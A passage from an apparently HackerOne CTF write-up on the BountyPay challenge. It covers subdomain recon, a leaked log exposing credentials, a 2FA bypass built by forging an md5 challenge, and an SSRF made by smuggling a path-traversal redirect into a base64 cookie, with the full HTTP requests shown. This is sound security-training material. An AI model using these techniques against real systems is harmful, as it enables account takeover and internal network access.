\u003ca title=\"https://hackerone.com/h1-ctf\" href=\"https://hackerone.com/h1-ctf\"\u003ehttps://hackerone.com/h1-ctf\u003c/a\u003e, made it clear that there are subdomains to be found, therefore the first thing I did was running a subdomain enumoration:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ findomain -t bountypay.h1ctf.com\n\nTarget ==\u0026gt; bountypay.h1ctf.com\n\nSearching in the Facebook API... üîç\nSearching in the Bufferover API... üîç\nSearching in the Threatminer API... üîç\nSearching in the AnubisDB API... üîç\nSearching in the CertSpotter API... üîç\nSearching in the Urlscan.io API... üîç\nSearching in the Threatcrowd API... üîç\nSearching in the Crtsh database API... üîç\nSearching in the Virustotal API... üîç\nSearching in the Sublist3r API... üîç\nSearching in the Spyse API... üîç\n\nstaff.bountypay.h1ctf.com\nsoftware.bountypay.h1ctf.com\napi.bountypay.h1ctf.com\napp.bountypay.h1ctf.com\nwww.bountypay.h1ctf.com\nbountypay.h1ctf.com\n\nA total of 6 subdomains were found for domain bountypay.h1ctf.com üëΩ in 2 seconds.‚è≤Ô∏è\n\nGood luck Hax0r üíÄ!\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch4 id=\"understanding-the-application\"\u003eUnderstanding the Application\u003c/h4\u003e\n\n\u003cp\u003eI hit all the domains, learnt how and what existed, including texts, descriptions, assets such as js and css and so on. Once done, I continued with my recon by fuzzing \u003ccode\u003eapp.bountypay.h1ctf.com\u003c/code\u003e.  \u003c/p\u003e\n\n\u003ch4 id=\"content-discovery\"\u003eContent Discovery\u003c/h4\u003e\n\n\u003cp\u003eAfter learning about the application and figuring which subdomains were available, I started to search for directories and files. This process gave me some fruits for later on, including: \u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eGET \u003ca title=\"https://app.bountypay.h1ctf.com/cgit\" href=\"/redirect?url=https%3A%2F%2Fapp.bountypay.h1ctf.com%2Fcgit\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://app.bountypay.h1ctf.com/cgit\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u003c/li\u003e\n\u003cli\u003eGET \u003ca title=\"https://app.bountypay.h1ctf.com/.git\" href=\"/redirect?url=https%3A%2F%2Fapp.bountypay.h1ctf.com%2F.git\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://app.bountypay.h1ctf.com/.git\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eGET \u003ca title=\"https://api.bountypay.h1ctf.com/api\" href=\"/redirect?url=https%3A%2F%2Fapi.bountypay.h1ctf.com%2Fapi\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://api.bountypay.h1ctf.com/api\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eGET \u003ca title=\"https://api.bountypay.h1ctf.com/api/staff\" href=\"/redirect?url=https%3A%2F%2Fapi.bountypay.h1ctf.com%2Fapi%2Fstaff\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://api.bountypay.h1ctf.com/api/staff\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eGET \u003ca title=\"https://api.bountypay.h1ctf.com//api/accounts/\" href=\"/redirect?url=https%3A%2F%2Fapi.bountypay.h1ctf.com%2F%2Fapi%2Faccounts%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://api.bountypay.h1ctf.com//api/accounts/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026lt;word\u0026gt;\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch3 id=\"step-2-open-redirect\"\u003eStep 2 - Open Redirect\u003c/h3\u003e\n\n\u003cp\u003eWhile doing my recon, I saw that \u003ca title=\"https://api.bountypay.h1ctf.com\" href=\"/redirect?url=https%3A%2F%2Fapi.bountypay.h1ctf.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://api.bountypay.h1ctf.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e as an open redirect on the main page: \u003ca title=\"https://api.bountypay.h1ctf.com/redirect?url=\" href=\"/redirect?url=https%3A%2F%2Fapi.bountypay.h1ctf.com%2Fredirect%3Furl%3D\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://api.bountypay.h1ctf.com/redirect?url=\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e... I knew that this would be useful later on so I kept it in my notes and moved to the next thing I found during my recon\u003c/p\u003e\n\n\u003ch4 id=\"step-3-information-disclosure-log-file\"\u003eStep 3 - Information Disclosure (Log File)\u003c/h4\u003e\n\n\u003cp\u003eScanning the \u003ccode\u003ecgit\u003c/code\u003e directory mentioned above, under the content discovery recon, I found information disclosure exposing a .git repository: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecat httpsapp.bountypay.h1ctf.com-cgit-FUZZ.fuzz.json | jq \u0026#39;.results[]\u0026#39;\n{\n  \u0026quot;input\u0026quot;: {\n    \u0026quot;FUZZ\u0026quot;: \u0026quot;config\u0026quot;\n  },\n  \u0026quot;position\u0026quot;: 97,\n  \u0026quot;status\u0026quot;: 200,\n  \u0026quot;length\u0026quot;: 278,\n  \u0026quot;words\u0026quot;: 19,\n  \u0026quot;lines\u0026quot;: 12,\n  \u0026quot;redirectlocation\u0026quot;: \u0026quot;\u0026quot;,\n  \u0026quot;url\u0026quot;: \u0026quot;https://app.bountypay.h1ctf.com/cgit/config\u0026quot;\n}\n{\n  \u0026quot;input\u0026quot;: {\n    \u0026quot;FUZZ\u0026quot;: \u0026quot;index\u0026quot;\n  },\n  \u0026quot;position\u0026quot;: 20,\n  \u0026quot;status\u0026quot;: 200,\n  \u0026quot;length\u0026quot;: 0,\n  \u0026quot;words\u0026quot;: 1,\n  \u0026quot;lines\u0026quot;: 1,\n  \u0026quot;redirectlocation\u0026quot;: \u0026quot;\u0026quot;,\n  \u0026quot;url\u0026quot;: \u0026quot;https://app.bountypay.h1ctf.com/cgit/index\u0026quot;\n}\n{\n  \u0026quot;input\u0026quot;: {\n    \u0026quot;FUZZ\u0026quot;: \u0026quot;description\u0026quot;\n  },\n  \u0026quot;position\u0026quot;: 3838,\n  \u0026quot;status\u0026quot;: 200,\n  \u0026quot;length\u0026quot;: 73,\n  \u0026quot;words\u0026quot;: 10,\n  \u0026quot;lines\u0026quot;: 2,\n  \u0026quot;redirectlocation\u0026quot;: \u0026quot;\u0026quot;,\n  \u0026quot;url\u0026quot;: \u0026quot;https://app.bountypay.h1ctf.com/cgit/description\u0026quot;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLooking into these files, I have found  \u003ca title=\"https://app.bountypay.h1ctf.com/cgit/config\" href=\"/redirect?url=https%3A%2F%2Fapp.bountypay.h1ctf.com%2Fcgit%2Fconfig\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://app.bountypay.h1ctf.com/cgit/config\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e exposed a github repository: \u003ca title=\"https://github.com/bounty-pay-code/request-logger.git\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fbounty-pay-code%2Frequest-logger.git\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/bounty-pay-code/request-logger.git\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e which contained one file [logger.php]() that showed me the way to the next step: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$data\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;IP\u0026#39;\u003c/span\u003e        \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e  \u003cspan class=\"nv\"\u003e$_SERVER\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;REMOTE_ADDR\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;URI\u0026#39;\u003c/span\u003e       \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e  \u003cspan class=\"nv\"\u003e$_SERVER\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;REQUEST_URI\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;METHOD\u0026#39;\u003c/span\u003e    \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e  \u003cspan class=\"nv\"\u003e$_SERVER\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;REQUEST_METHOD\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e\n  \u003cspan class=\"s1\"\u003e\u0026#39;PARAMS\u0026#39;\u003c/span\u003e    \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e  \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n      \u003cspan class=\"s1\"\u003e\u0026#39;GET\u0026#39;\u003c/span\u003e   \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e  \u003cspan class=\"nv\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"s1\"\u003e\u0026#39;POST\u0026#39;\u003c/span\u003e  \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e  \u003cspan class=\"nv\"\u003e$_POST\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"nb\"\u003efile_put_contents\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;bp_web_trace.log\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nb\"\u003edate\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;U\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;:\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nb\"\u003ebase64_encode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003ejson_encode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$data\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nx\"\u003eFILE_APPEND\u003c/span\u003e   \u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ca href=\"/redirect?url=http%3A%2F%2Fbp_web_trace.log\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://app.bountypay.h1ctf.com/bp_web_trace.log\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e log file contained the following base64 decoded strings: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==\n1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==\n1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19\n1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eEncoding these strings resulted with the username, password, a hint about a 2FA challenge and a possible action within the app: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\u0026quot;IP\u0026quot;:\u0026quot;192.168.1.1\u0026quot;,\u0026quot;URI\u0026quot;:\u0026quot;\\/\u0026quot;,\u0026quot;METHOD\u0026quot;:\u0026quot;GET\u0026quot;,\u0026quot;PARAMS\u0026quot;:{\u0026quot;GET\u0026quot;:[],\u0026quot;POST\u0026quot;:[]}}\n1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==\n{\u0026quot;IP\u0026quot;:\u0026quot;192.168.1.1\u0026quot;,\u0026quot;URI\u0026quot;:\u0026quot;\\/\u0026quot;,\u0026quot;METHOD\u0026quot;:\u0026quot;POST\u0026quot;,\u0026quot;PARAMS\u0026quot;:{\u0026quot;GET\u0026quot;:[],\u0026quot;POST\u0026quot;:{\u0026quot;username\u0026quot;:\u0026quot;brian.oliver\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;V7h0inzX\u0026quot;}}}\n1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==\n{\u0026quot;IP\u0026quot;:\u0026quot;192.168.1.1\u0026quot;,\u0026quot;URI\u0026quot;:\u0026quot;\\/\u0026quot;,\u0026quot;METHOD\u0026quot;:\u0026quot;POST\u0026quot;,\u0026quot;PARAMS\u0026quot;:{\u0026quot;GET\u0026quot;:[],\u0026quot;POST\u0026quot;:{\u0026quot;username\u0026quot;:\u0026quot;brian.oliver\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;V7h0inzX\u0026quot;,\u0026quot;challenge_answer\u0026quot;:\u0026quot;bD83Jk27dQ\u0026quot;}}}\n1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19\n{\u0026quot;IP\u0026quot;:\u0026quot;192.168.1.1\u0026quot;,\u0026quot;URI\u0026quot;:\u0026quot;\\/statements\u0026quot;,\u0026quot;METHOD\u0026quot;:\u0026quot;GET\u0026quot;,\u0026quot;PARAMS\u0026quot;:{\u0026quot;GET\u0026quot;:{\u0026quot;month\u0026quot;:\u0026quot;04\u0026quot;,\u0026quot;year\u0026quot;:\u0026quot;2020\u0026quot;},\u0026quot;POST\u0026quot;:[]}}\n1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch3 id=\"step-4-improper-authorization\"\u003eStep 4 - Improper Authorization\u003c/h3\u003e\n\n\u003cp\u003eOnce I tried to login with the credentials that I found, aka \u003ccode\u003eusername: brian.oliver\u003c/code\u003e, \u003ccode\u003epassword: V7h0inzX\u003c/code\u003e, I saw a 2FA. \u003c/p\u003e\n\n\u003cp\u003eLooking into the input fields in the HTML, I saw that the challenge and the challenge\u0026#39;s answer were sent together within the same request. I had it clear that the challenge was hashed with md5, so I tried to use my own hash by using \u003ccode\u003emd5 -s 1\u003c/code\u003e which resulted with \u003ccode\u003ec4ca4238a0b923820dcc509a6f75849b\u003c/code\u003e and then I just used \u003ccode\u003e1\u003c/code\u003e in order to login, and it worked. The request looked like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST / HTTP/1.1\nHost: app.bountypay.h1ctf.com\nContent-Length: 101\nContent-Type: application/x-www-form-urlencoded\n\nusername=brian.oliver\u0026amp;password=V7h0inzX\u0026amp;challenge=c4ca4238a0b923820dcc509a6f75849b\u0026amp;challenge_answer=1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eand the response: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 302 Found\nServer: nginx/1.14.0 (Ubuntu)\nDate: Tue, 09 Jun 2020 16:14:12 GMT\nContent-Type: text/html; charset=UTF-8\nConnection: keep-alive\nSet-Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9; expires=Thu, 09-Jul-2020 16:14:12 GMT; Max-Age=2592000\nLocation: /\nContent-Length: 0\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eUsing this new cookie, I was logged in as Brian Oliver.\u003c/p\u003e\n\n\u003ch3 id=\"step-5-ssrf\"\u003eStep 5 - SSRF\u003c/h3\u003e\n\n\u003cp\u003eAfter I bypassed the application\u0026#39;s 2FA using Brain Oliver\u0026#39;s credentials, I tried to play with the application\u0026#39;s feature. The application had only one available feature which was suppose to show me the payment statements of the company, but trying to fetch this data resulted with nothing new. \u003c/p\u003e\n\n\u003cp\u003eI looked into the request and I saw that it was doing the following request: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /statements?month=01\u0026amp;year=2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\nConnection: close\nAccept: */*\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\nX-Requested-With: XMLHttpRequest\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://app.bountypay.h1ctf.com/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,he;q=0.8\nCookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhile returning the following response:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 200 OK\nServer: nginx/1.14.0 (Ubuntu)\nDate: Tue, 09 Jun 2020 16:17:38 GMT\nContent-Type: application/json\nConnection: close\nContent-Length: 177\n\n{\u0026quot;url\u0026quot;:\u0026quot;https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/F8gHiqSdpK\\/statements?month=01\u0026amp;year=2020\u0026quot;,\u0026quot;data\u0026quot;:\u0026quot;{\\\u0026quot;description\\\u0026quot;:\\\u0026quot;Transactions for 2020-01\\\u0026quot;,\\\u0026quot;transactions\\\u0026quot;:[]}\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAt that point I also looked at the token cookie, which I got when I bypassed the 2FA. Once I decoded its base64, I figured that I might be able to change the request by using the cookie. \u003c/p\u003e\n\n\u003cp\u003eThe cookie: \u003ccode\u003eeyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9\u003c/code\u003e \u003cbr\u003e\nDecoded: \u003ccode\u003e{\u0026quot;account_id\u0026quot;:\u0026quot;F8gHiqSdpK\u0026quot;,\u0026quot;hash\u0026quot;:\u0026quot;de235bffd23df6995ad4e0930baac1a2\u0026quot;}\u003c/code\u003e \u003c/p\u003e\n\n\u003cp\u003eConsidering the fact that the \u003ccode\u003eaccount_id\u003c/code\u003e was available in both the cookie and the response from the request above, I tried to change it and see how it reacted. This is the point where I was finally able to use the open redirect that I have found on stage 2. \u003c/p\u003e\n\n\u003cp\u003eI created a new cookie: \u003ccode\u003e{\u0026quot;account_id\u0026quot;:\u0026quot;../../redirect?url=FUZZ\u0026amp;\u0026quot;,\u0026quot;hash\u0026quot;:\u0026quot;de235bffd23df6995ad4e0930baac1a2\u0026quot;}\u003c/code\u003e and passed it to ffuf using a script that generated a wordlist and encoded all of the possible words in base64. My wordlist was a mix of two things: \u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eKnown words and files\u003c/li\u003e\n\u003cli\u003eIdeas I got while doing recon - one thing I figured during the recon was that the software.bountypay.h1ctf.com was only accessable from within the company\u0026#39;s network and if I find an SSRF, together with the open redirect, I would have defintly checked it out. \u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003ePutting everything together, I found a directory listing while fuzzing which leads me to the next step \u003c/p\u003e\n\n\u003ch3 id=\"step-6-information-disclosure-directory-listing-in-house-apk\"\u003eStep 6 - Information Disclosure (Directory Listing, In-house APK)\u003c/h3\u003e\n\n\u003cp\u003eAs mentioned in the previous step, I got a hit while fuzzing through the SSRF by using the open redirect I have found earlier. The final request was as following: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /statements?month=01\u0026amp;year=2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\nCookie: token=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS91cGxvYWRzLyYiLCJoYXNoIjoiZGUyMzViZmZkMjNkZjY5OTVhZDRlMDkzMGJhYWMxYTIifQ==\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eand it\u0026#39;s response gave me the hint for the next step: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003eHTTP/1.1 200 OK\nServer: nginx/1.14.0 (Ubuntu)\nDate: Tue, 09 Jun 2020 16:27:29 GMT\nContent-Type: application/json\nConnection: keep-alive\nContent-Length: 491\n\n{\u0026quot;url\u0026quot;:\u0026quot;https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/..\\/..\\/redirect?url=https:\\/\\/software.bountypay.h1ctf.com\\/uploads\\/\u003cspan class=\"err\"\u003e\u0026amp;\u003c/span\u003e\\/statements?month=01\u003cspan class=\"err\"\u003e\u0026amp;\u003c/span\u003eyear=2020\u0026quot;,\u0026quot;data\u0026quot;:\u0026quot;\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\\n\u003cspan class=\"nt\"\u003e\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;\u003c/span\u003eIndex of \\/uploads\\/\u003cspan class=\"nt\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"err\"\u003e\\/\u003c/span\u003e\u003cspan class=\"na\"\u003etitle\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;\u003c/span\u003e\u003cspan class=\"err\"\u003e\\/\u003c/span\u003e\u003cspan class=\"na\"\u003ehead\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\\n\u003cspan class=\"nt\"\u003e\u0026lt;body\u003c/span\u003e \u003cspan class=\"na\"\u003ebgcolor=\u003c/span\u003e\u003cspan class=\"s\"\u003e\\\u0026quot;white\\\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\\n\u003cspan class=\"nt\"\u003e\u0026lt;h1\u0026gt;\u003c/span\u003eIndex of \\/uploads\\/\u003cspan class=\"nt\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"err\"\u003e\\/\u003c/span\u003e\u003cspan class=\"na\"\u003eh1\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;hr\u0026gt;\u0026lt;pre\u0026gt;\u0026lt;a\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\\\u0026quot;..\\/\\\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e..\\/\u003cspan class=\"nt\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"err\"\u003e\\/\u003c/span\u003e\u003cspan class=\"na\"\u003ea\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\\n\u003cspan class=\"nt\"\u003e\u0026lt;a\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\\\u0026quot;\\/uploads\\/BountyPay.apk\\\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eBountyPay.apk\u003cspan class=\"nt\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"err\"\u003e\\/\u003c/span\u003e\u003cspan class=\"na\"\u003ea\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e                                        20-Apr-2020 11:26              4043701\\n\u003cspan class=\"nt\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"err\"\u003e\\/\u003c/span\u003e\u003cspan class=\"na\"\u003epre\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;hr\u0026gt;\u0026lt;\u003c/span\u003e\u003cspan class=\"err\"\u003e\\/\u003c/span\u003e\u003cspan class=\"na\"\u003ebody\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\\n\u003cspan class=\"nt\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"err\"\u003e\\/\u003c/span\u003e\u003cspan class=\"na\"\u003ehtml\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\\n\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLooking at the JSON response, we can see that there was an APK file availble in /uploads/BountyPay.apk. Hitting the full URL \u003ca title=\"https://software.bountypay.h1ctf.com/uplodas/\" href=\"/redirect?url=https%3A%2F%2Fsoftware.bountypay.h1ctf.com%2Fuplodas%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://software.bountypay.h1ctf.com/uplodas/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e worked even for non authenticated users. \u003c/p\u003e\n\n\u003ch3 id=\"step-7-reverse-enginerring-apk\"\u003eStep 7 - Reverse Enginerring (APK)\u003c/h3\u003e\n\n\u003cp\u003eWhen I see an APK or a target that has an APK I usually check its content by either unzipping it or disaassmbiling it. \u003c/p\u003e\n\n\u003cp\u003eIn this case, I used dex2jar in order to create a 